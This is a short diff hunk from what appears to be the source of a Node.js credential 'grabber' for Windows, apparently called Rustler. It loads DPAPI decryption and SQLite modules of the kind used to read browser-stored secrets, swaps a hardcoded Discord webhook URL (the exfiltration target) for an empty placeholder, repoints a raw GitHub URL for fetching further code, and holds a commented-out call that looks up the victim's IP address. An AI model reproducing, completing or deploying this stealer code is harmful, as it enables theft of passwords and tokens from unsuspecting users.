@@ -10,8 +10,8 @@ const crypto = require('crypto');
 //const sqlite3 = require('sqlite3');
 const dpapi = require("nexe-natives-fix")(require.resolve("win-dpapi"));
 const sqlite3 = require("nexe-natives-fix")(require.resolve("sqlite3"));
-const src = ("https://canary.discord.com/api/webhooks/954345897704169523/ZaHI5ax4RDcrY7q7kjvx1m7HJgmJbOBdLVcUkz5Ua4XlP4AzME575-XpAqx1LuCFX-Ps")
-const github = "https://raw.githubusercontent.com/RustlerJS/rustlers/main/rust1"
+const src = ("") //webhook url
+const github = "https://raw.githubusercontent.com/Kenil35/rustler-grabber-src/main/rust1.js"
 /*((async () => {
     await axios.get('https://ipconfig.io/json')
         .then(res => {
